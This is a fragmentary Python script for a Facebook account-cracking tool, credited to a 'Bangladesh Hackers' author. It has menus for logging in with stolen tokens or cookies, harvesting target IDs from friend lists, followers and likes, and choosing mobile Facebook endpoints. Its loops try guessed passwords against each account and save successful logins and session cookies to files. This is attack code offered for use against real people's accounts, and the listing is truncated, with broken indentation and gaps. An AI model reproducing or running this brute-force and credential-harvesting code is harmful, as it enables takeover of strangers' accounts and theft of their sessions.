...
\033[1;96m   ║ M ║ ♪♪   
\033[1;96m   ║ r ║♫♪  
\033[1;96m   ║ ◎♫♪♫   [♫] BANGLADESH HACKERS [♫]  
\033[1;96m╔══0═══0═════00o═══════════════════════════╗  
\033[1;96m█ ✯AUTHOR   : Niki404-Cyber                █  
\033[1;96m█ ✯YOUTUBE  : Mr. NIKI                     █  
\033[1;96m█ ✯FACEBOKK : Niki.Cyber404                █  
\033[1;96m█ ✯WHATSAPP : +8801927294533               █   
\033[1;96m█ ✯GITHUB   : Niki404-Cyber                █  
\033[1;96m╚══0═══0═════00o═══════════════════════════╝
\033[1;92m   
\033[1;92m-------------------------------------------"""
...
def login():
    ...
    print logo
    print('\033[1;96m══════════════════════════════════════════')
    print('\033[1;92m[1] Login FB Token')
    print('\033[1;92m[2] Login FB Cookies')
    print('\033[1;92m[3] Cara Dapat Token/Cookies')
...
def menu():
  ...
  print logo
  print('\033[1;96m══════════════════════════════════════════')
  print('\033[1;92m[•] Name : '+nm)
  print('\033[1;92m[•] Your ID : '+id)
  print('\033[1;92m[•] Birthday : '+tl)
  print('\033[1;96m══════════════════════════════════════════')
  print('\033[1;92m[1] CRACK ID FRIEND LIST')
  print('\033[1;92m[2] CRACK ID PUBLIC')
  print('\033[1;92m[3] CRACK ID FOLLOWING')
  print('\033[1;92m[4] CRACK ID LIST LIKE')
  print('\033[1;92m[5] Lihat Hasil Crack')
  print('\033[1;91m[0] BACK & EIXT TOKEN/COOKIES')
  print('\033[1;96m══════════════════════════════════════════')
  mn=raw_input("[?] Input : ")
  if mn=="":
...
def metode():
    print('\033[1;92m[1] Metode mbasic.facebook.com')
    print('\033[1;92m[2] Metode mobile.facebook.com')
    print('\033[1;92m[3] Metode free.facebook.com')
    md = raw_input('[?] Input : ')
    if md == '':
	exit()
    elif md == '1' or md == '01':
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					menu()
					continue
				print('[•] Hasil NIKI-OK Saved ID OK.txt')
				print('[•] Hasil NIKI-CP Saved ID CP.txt')
				print('\033[1;96m══════════════════════════════════════════')
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print("\r\033[0;92m[NIKI-OK] "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+" "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("NIKI-OK.txt").read():
						break
					else:
						open("Ok.txt","a+").write(
					...
					print("\r\033[0;93m[NIKI-CP] "+(fl.get("id")+" \033[0;97m|\033[0;93m "+i+"\033[0;93m "+tl+" "))
			...
			self.ko+=1
			print "\r[Crack] %s/%s *NIKI-OK : %s - *NIKI-CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print("\r\033[0;92m[NIKI-OK] "+(fl.get("id")+"\033[0;97m | \033[0;92m"+i+" "))
					self.ada.append("%s | %s"%(fl.get("id"),i))
					if fl.get("id") in open("NIKI-OK").read():
						break
					else:
						open("Ok.txt","a+").write(
						"%s | %s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies"))))
